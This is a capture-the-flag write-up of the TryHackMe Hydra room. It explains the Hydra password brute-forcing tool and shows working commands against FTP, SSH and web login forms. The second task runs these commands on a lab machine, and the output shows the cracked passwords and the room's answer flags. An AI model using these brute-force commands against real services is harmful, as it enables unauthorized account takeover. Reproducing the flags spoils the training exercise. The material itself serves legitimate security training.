# THM - Hydra

[TryHackMe](https://tryhackme.com/room/hydra)

> Michael Jack | 06/2022

---

## Task 1 - Hydra Introduction

Hydra is a brute-force password attacking tool.

> We can use Hydra to run through a list and 'bruteforce' some authentication service.
> Imagine trying to manually guess someones password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

> Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.

*For more information on each protocol with hydra*: https://en.kali.tools/?p=220 

---

## Task 2 - Using Hydra

There are different options used with Hydra depending on the protocol we are attacking.

> For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt

### Example Hydra Comands

- FTP: `hydra -l user -P passlist.txt ftp://MACHINE_IP`
- SSH: `hydra -l <username> -P <full path to pass> 10.10.73.125 -t 4 ssh`
- Post Web Form: `hydra -l <username> -P <wordlist> 10.10.73.125 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

### Questions

> Use Hydra to bruteforce molly's web password. What is flag 1?

```shell
hydra -l molly -P /opt/rockyou.txt 10.10.73.125 http-post-form '/login:username=^USER^&password=^P  
ASS^:F=incorrect'

[80][http-post-form] host: 10.10.73.125   login: molly   password: sunshine
```

```
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

> Use Hydra to bruteforce molly's SSH password. What is flag 2?

```shell
hydra -l molly -P /home/michaelj/projects/assets/rockyou.txt 10.10.73.125 -t 4 ssh

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret servic  
e organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway)  
.  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-08 04:54:26  
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries  
per task  
[DATA] attacking ssh://10.10.73.125:22/  
[22][ssh] host: 10.10.73.125   login: molly   password: butterfly  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-08 04:55:27
```

```
THM{c8eeb0468febbadea859baeb33b2541b}
```

---
